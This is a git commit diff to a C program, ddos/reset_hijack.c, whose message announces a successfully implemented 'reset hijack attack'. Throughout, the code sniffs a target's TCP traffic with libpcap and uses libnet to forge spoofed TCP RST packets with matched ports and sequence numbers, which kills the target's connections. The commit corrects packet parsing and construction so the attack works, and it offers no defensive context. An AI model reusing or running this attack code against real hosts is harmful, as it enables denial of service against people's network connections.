580d435de47cd14d7151350326114c7949ffc909
Phuong Do <dongphuong2004@gmail.com>
2017-12-15 15:51:32 +0900

    Successfully implement reset hijack attack

--- ddos/reset_hijack.c
+++ ddos/reset_hijack.c
@@ -3,7 +3,7 @@
 #include <libnet.h>
 #include <pcap/pcap.h>
 #include <linux/ip.h>
-#include <linux/tcp.h>
+#include <netinet/tcp.h>
 #include <net/ethernet.h>
 
 typedef struct _cb_data
@@ -31,27 +31,21 @@ int main(int argc, char **argv)
         printf("usage : ./%s <interface> <target IP>\n", argv[0]);
         exit(EXIT_SUCCESS);
     }
+    char *interface = argv[1];
+    char *target = argv[2];
     char lnet_errbuf[LIBNET_ERRBUF_SIZE];
 
     /* Open network interface */
-    libnet_t *lnet = libnet_init(LIBNET_RAW4, NULL, lnet_errbuf);
+    libnet_t *lnet = libnet_init(LIBNET_RAW4, interface, lnet_errbuf);
     if (!lnet) {
         fprintf(stderr, "Error init libnet interface %s\n", lnet_errbuf);
         exit(EXIT_FAILURE);
     }
 
-    /* Resove IP address */
-    u_long target_ip = libnet_name2addr4(lnet, argv[2], LIBNET_RESOLVE);
-    if (target_ip == -1) {
-        fprintf(stderr, "Error resolve target ip %s\n", argv[1]);
-        exit(EXIT_FAILURE);
-    }
-
-    char *dev = argv[1];
     char pcap_errbuf[PCAP_ERRBUF_SIZE];
 
     /* Open pcap handle (pcap_open_live) */
-    pcap_t *hdlr = pcap_open_live(dev, 1024, 1, 1000, pcap_errbuf);
+    pcap_t *hdlr = pcap_open_live(interface, 1024, 1, 1000, pcap_errbuf);
     if (!hdlr) {
         fprintf(stderr, "Error open pcap  handler %s\n", pcap_errbuf);
         exit(EXIT_FAILURE);
@@ -62,9 +56,7 @@ int main(int argc, char **argv)
     libnet_seed_prand(lnet);
 
     /* Set packet filter to filter ACK packet only */
-    struct in_addr target;
-    target.s_addr = target_ip;
-    set_packet_filter(hdlr, argv[2]);
+    set_packet_filter(hdlr, target);
 
     /* Start capture packet (pcap_loop) */
     cb_data *data = (cb_data *)calloc(1, sizeof(cb_data));
@@ -97,31 +89,14 @@ void caught_packet(u_char *user_args, const struct pcap_pkthdr *cap_header, cons
 {
     cb_data *data = (cb_data *)user_args;
 
-    /* Build packet ip part (libnet_build_ip)*/
-    struct iphdr *ip_hdr = (struct iphdr *)(packet + sizeof(struct  ether_header));
-    data->ip_tag = libnet_build_ipv4(
-                    LIBNET_TCP_H + LIBNET_IPV4_H,       /* Total packet len */
-                    IPTOS_LOWDELAY,                     /* tos */
-                    libnet_get_prand(LIBNET_PR16),      /* IP ID */
-                    0,                                  /* IP Frag */
-                    64,                                 /* TTL */
-                    IPPROTO_TCP,                        /* Upper layer protocol */
-                    0,                                  /* Checksum */
-                    ip_hdr->daddr,                      /* Source ip */
-                    ip_hdr->saddr,                      /* Dest ip */
-                    NULL,                               /* Payload */
-                    0,                                  /* Payload size */
-                    data->lnet,                         /* libnet context */
-                    data->ip_tag                        /* ptag */
-                );
-
     /* Build packet tcp part (RESET flags enabled) (libnet_build_tcp)*/
-    struct tcphdr *tcp_hdr = (struct tcphdr *)(ip_hdr + sizeof(struct iphdr));;
+    struct tcphdr *tcp_hdr = (struct tcphdr *)(packet + sizeof(struct ether_header) + sizeof(struct iphdr));
     data->tcp_tag = libnet_build_tcp(
-                tcp_hdr->dest,                      /* source TCP port */
-                tcp_hdr->source,                    /* destination TCP port */
-                tcp_hdr->ack_seq >> 16,             /* sequence number */
-                libnet_get_prand(LIBNET_PRu16),     /* acknoledgement number */
+                ntohs(tcp_hdr->th_dport),               /* source TCP port */
+                ntohs(tcp_hdr->th_sport),             /* destination TCP port */
+                ntohl(tcp_hdr->th_ack),             /* sequence number */
+                //libnet_get_prand(LIBNET_PRu16),     /* acknoledgement number */
+                9999,                              /* acknoledgement number */
                 TH_RST,                             /* control flags */
                 1024,                               /* Windows size */
                 0,                                  /* checksum */
@@ -133,8 +108,31 @@ void caught_packet(u_char *user_args, const struct pcap_pkthdr *cap_header, cons
                 data->tcp_tag                             /* ptag */
             );
 
+    /* Build packet ip part (libnet_build_ip)*/
+    struct iphdr *ip_hdr = (struct iphdr *)(packet + sizeof(struct  ether_header));
+    data->ip_tag = libnet_build_ipv4(
+                    LIBNET_TCP_H + LIBNET_IPV4_H,       /* Total packet len */
+                    IPTOS_LOWDELAY,                     /* tos */
+                    libnet_get_prand(LIBNET_PR16),      /* IP ID */
+                    0,                                  /* IP Frag */
+                    64,                                 /* TTL */
+                    IPPROTO_TCP,                        /* Upper layer protocol */
+                    0,                                  /* Checksum */
+                    ip_hdr->daddr,               /* Source ip */
+                    ip_hdr->saddr,                /* Dest ip */
+                    NULL,                               /* Payload */
+                    0,                                  /* Payload size */
+                    data->lnet,                         /* libnet context */
+                    data->ip_tag                        /* ptag */
+                );
+
+
     /* Send packet to network */ 
-    libnet_write(data->lnet);
+    int res = libnet_write(data->lnet);
+    if (res != -1)
+        printf("Successfully write packet sequence %u from %u to %u\n", ntohl(tcp_hdr->th_ack), ntohs(tcp_hdr->th_dport), ntohs(tcp_hdr->th_sport));
+    else
+        printf("%d\n", res);
 
     usleep(5000);
 }
